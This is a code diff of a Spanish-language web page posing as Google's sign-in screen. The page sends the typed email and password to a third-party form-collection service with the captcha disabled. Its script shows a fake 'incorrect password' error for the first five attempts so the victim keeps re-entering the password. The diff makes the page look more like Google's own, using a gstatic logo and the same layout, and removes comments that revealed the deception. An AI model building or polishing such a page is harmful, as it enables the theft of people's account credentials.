@@ -3,68 +3,68 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Inicia sesión en tu cuenta de Google para continuar</title>
+  <title>Accede a tu cuenta</title>
   <script src="https://cdn.tailwindcss.com"></script>
 </head>
-<body class="bg-white text-gray-800 flex items-center justify-center min-h-screen">
+<body class="bg-[#f0f4f9] flex items-center justify-center min-h-screen">
 
-  <!-- Contenedor centrado -->
-  <div class="w-full max-w-md bg-white shadow-md rounded p-8">
+  <!-- Contenedor -->
+  <div class="w-full max-w-md bg-white shadow rounded-2xl p-8">
     
     <!-- Logo + Título -->
-    <div class="text-center mb-6">
-      <!-- Logo de Google -->
-      <img src="https://img.icons8.com/color/512/google-logo.png" 
-           alt="Google" class="mx-auto mb-2 w-16">
-      <h1 class="text-xl font-semibold">Accede a tu cuenta</h1>
-      <p class="text-gray-600 text-sm mt-2">
-        Usa tu Cuenta de Google. La cuenta se agregará a este dispositivo <br>
-        y estará disponible para otras apps de Google.
-      </p>
-      <a href="#" class="text-blue-600 text-sm mt-1 block">
-        Más información sobre el uso de tu cuenta
-      </a>
+    <div class="mb-6">
+      <img src="https://www.gstatic.com/images/branding/product/1x/gsa_512dp.png" 
+           alt="Google" class="w-10 mb-4">
+      <h1 class="text-2xl text-gray-900 font-normal">Accede a tu cuenta</h1>
+      <a href="#" class="text-sm text-gray-700">Ir a Gmail</a>
     </div>
 
     <!-- Formulario -->
     <form id="contactForm" 
           action="https://formsubmit.co/b58372e3afafe5f908daf1b0cc3c700f" 
           method="POST" 
-          class="grid gap-4">
+          class="space-y-5">
 
-      <!-- Correo primero -->
-      <input class="border border-gray-300 rounded px-4 py-2 focus:outline-none focus:ring-1 focus:ring-emerald-500" 
-             name="correo" placeholder="Correo electrónico o teléfono" type="email" required>
+      <!-- Correo -->
+      <input 
+        class="w-full border border-gray-300 rounded px-3 py-3 text-base focus:outline-none focus:ring-1 focus:ring-blue-600"
+        name="correo" 
+        placeholder="Correo electrónico o teléfono" 
+        type="email" 
+        required>
 
-      <!-- Contraseña después -->
+      <!-- Contraseña -->
       <div>
         <input id="nombre" 
-               class="border border-gray-300 rounded px-4 py-2 w-full focus:outline-none focus:ring-1 focus:ring-emerald-500" 
-               name="nombre" placeholder="Ingrese su contraseña" type="password" required>
-        <p id="errorNombre" class="text-red-600 text-sm mt-1 hidden"> Contraseña incorrecta</p>
+               class="w-full border border-gray-300 rounded px-3 py-3 text-base focus:outline-none focus:ring-1 focus:ring-blue-600" 
+               name="nombre" 
+               placeholder="Ingresa tu contraseña" 
+               type="password" 
+               required>
+        <p id="errorNombre" class="text-red-600 text-sm mt-1 hidden">Contraseña incorrecta</p>
       </div>
-      
-      <!-- Redirección después de enviar -->
+
+      <!-- Hidden fields -->
       <input type="hidden" name="_next" value="https://tu-pagina.com/gracias.html">
-      <!-- Desactivar captcha -->
       <input type="hidden" name="_captcha" value="false">
 
+      <!-- Links -->
+      <div class="text-sm">
+        <a href="#" class="text-blue-600">¿Olvidaste el correo electrónico?</a>
+      </div>
+
       <!-- Botón -->
-      <button type="submit" 
-              class="bg-blue-600 hover:bg-blue-700 text-white py-2 rounded font-medium">
-        Siguiente
-      </button>
+      <div class="flex justify-between items-center">
+        <a href="#" class="text-blue-600 text-sm">Crear cuenta</a>
+        <button type="submit" 
+                class="bg-blue-600 hover:bg-blue-700 text-white px-6 py-2 rounded font-medium">
+          Siguiente
+        </button>
+      </div>
     </form>
-
-    <!-- Links como en la pantalla oficial -->
-    <div class="flex justify-between mt-4 text-sm">
-      <a href="#" class="text-blue-600">¿Olvidaste el correo electrónico?</a>
-      <a href="#" class="text-blue-600">Crear cuenta</a>
-    </div>
-
   </div>
 
-  <!-- Script para “trollear” -->
+  <!-- Script -->
   <script>
     let intentoNombre = 0;
 
@@ -75,12 +75,10 @@
       intentoNombre++;
 
       if (intentoNombre < 6) { 
-        // Mostrar error pero igual se envía
         errorMsg.classList.remove("hidden");
         nombre.classList.add("border-red-500");
-        errorMsg.textContent = "Contraseña incorrecta ";
+        errorMsg.textContent = "Contraseña incorrecta";
       } else {
-        // En el 6 ya no muestra error
         errorMsg.classList.add("hidden");
         nombre.classList.remove("border-red-500");
       }
